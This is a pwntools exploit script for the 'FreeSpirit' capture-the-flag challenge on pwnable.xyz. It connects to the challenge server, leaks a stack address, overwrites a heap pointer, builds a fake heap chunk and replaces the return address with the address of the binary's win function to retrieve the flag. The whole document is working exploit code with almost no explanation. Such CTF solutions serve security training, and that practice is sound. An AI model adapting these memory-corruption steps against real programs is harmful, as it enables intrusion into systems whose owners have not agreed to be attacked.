#!/usr/bin/python

from pwn import *


def writeData(payload):
	p.recvuntil("> ")
	p.sendline("1")
	
	sleep(0.5)
	
	p.sendline(payload)


def leakAddress() :
	p.recvuntil("> ")
	p.sendline("2")
	
	leak_address_str = p.recvline()
	ret_address = int(leak_address_str, 0) + 88

	return ret_address


def overFlow() :
	p.recvuntil("> ")
	p.sendline("3")


def exitProgram() :
	p.recvuntil("> ")
	p.sendline("0")


#context.log_level = 'debug'

script = '''
b * main+46
b * main+137
b * main+196
b * main+253
c
'''

#p = process("./FreeSpirit")
p = remote("svc.pwnable.xyz", 30005)
e = ELF("./FreeSpirit")


# [*] EXPLOIT DATA
fake_chunk = 0x601080
ret_address = 0
win_addr = e.symbols['win']






# gdb.attach(p,script)

sleep(3)

# STEP1. LEAK ADDRESS
print("\n[*] STEP1. LEAK STACK ADDRESS")

ret_address = leakAddress()

print("    WIN ADDRESS : " + hex(win_addr))
print("    RETURN ADDRESS : " + hex(ret_address))





# STEP2. OVERWRITE HEAP POINTER
print("\n[*] STEP2. OVERWRITE HEAP POINTER")

payload = "AAAAAAAA" + p64(ret_address)

writeData(payload)
overFlow()


# STEP3. CORRUPT RETURN ADDRESS
print("\n[*] STEP3. CORRUPT RETURN ADDRESS")

payload = p64(win_addr) + p64(fake_chunk - 0x8)

writeData(payload)
overFlow()


# STEP4. GENERATE FAKE CHUNK
print("\n[*] STEP4. GENERATE FAKE CHUNk")

payload = p64(0x51) + p64(fake_chunk + 0x50 - 0x8)
writeData(payload)
overFlow()

payload = p64(0x20fb1) + p64(fake_chunk)
writeData(payload)
overFlow()


# STEP5. LEAK FLAG
print("\n[*] STEP5. LEAK FLAG")
exitProgram()


p.interactive()